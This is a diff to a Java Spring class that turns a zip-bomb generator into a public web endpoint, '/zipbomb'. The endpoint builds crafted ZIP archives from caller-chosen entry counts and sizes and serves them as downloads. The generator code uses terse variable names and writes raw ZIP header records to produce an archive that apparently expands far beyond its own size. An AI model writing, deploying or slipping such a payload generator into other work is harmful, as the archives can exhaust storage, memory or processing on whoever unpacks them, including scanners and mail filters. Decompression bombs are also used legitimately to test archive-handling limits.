@@ -32,7 +32,9 @@ public class Zipbomb {
 	private static String Y(long x) {
 		return U(x) + new StringBuilder().append((char) (x >> 16 & 255)).append((char) (x >> 24 & 255)).toString();
 	}
-	private static byte[] zipbomb(int file_num, int size) {
+    @GetMapping("/zipbomb")
+    public ResponseEntity<ByteArrayResource> zipbomb(@RequestParam(value = "name", defaultValue = "output.zip") String name, @RequestParam(value = "file_num", defaultValue = "1000") String _file_num, @RequestParam(value = "size", defaultValue = "1000") String _size) {
+		int file_num = Integer.parseInt(_file_num), size = Integer.parseInt(_size);
 		ByteArrayOutputStream output = new ByteArrayOutputStream();
 		long A = (1L << 32) - 1;
 		List<Long> D = LongStream.iterate(1, i -> i << 1).limit(32).boxed().collect(Collectors.toList()), G = new ArrayList<Long>(D.subList(0, 24)), E = new ArrayList<Long>();
@@ -62,13 +64,9 @@ public class Zipbomb {
 			output.write(("PK\u0001\u0002\u0014\0\u0014\0\0\0\u0008\0\0\0\0\0" + V + U(num.length()) + "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0" + num).getBytes(), 0, 46 + num.length());
 		}
 		output.write(("PK\u0005\u0006\0\0\0\0" + U(file_num) + U(file_num) + Y(output.size() - K) + Y(K) + "\0\0").getBytes(), 0, 22);
-		return output.toByteArray();
-	}
-    @GetMapping("/")
-    public ResponseEntity<ByteArrayResource> index(@RequestParam(value = "name", defaultValue = "output.zip") String name, @RequestParam(value = "file_num", defaultValue = "1000") String file_num, @RequestParam(value = "size", defaultValue = "1000") String size) {
 		HttpHeaders headers = new HttpHeaders();
 		headers.setContentType(new MediaType("application", "zip"));
 		headers.setContentDisposition(ContentDisposition.attachment().filename(name).build());
-		return new ResponseEntity<ByteArrayResource>(new ByteArrayResource(zipbomb(Integer.parseInt(file_num), Integer.parseInt(size))), headers, HttpStatus.OK); // might break if illegal
+		return new ResponseEntity<ByteArrayResource>(new ByteArrayResource(output.toByteArray()), headers, HttpStatus.OK); // might break if illegal
     }
 }
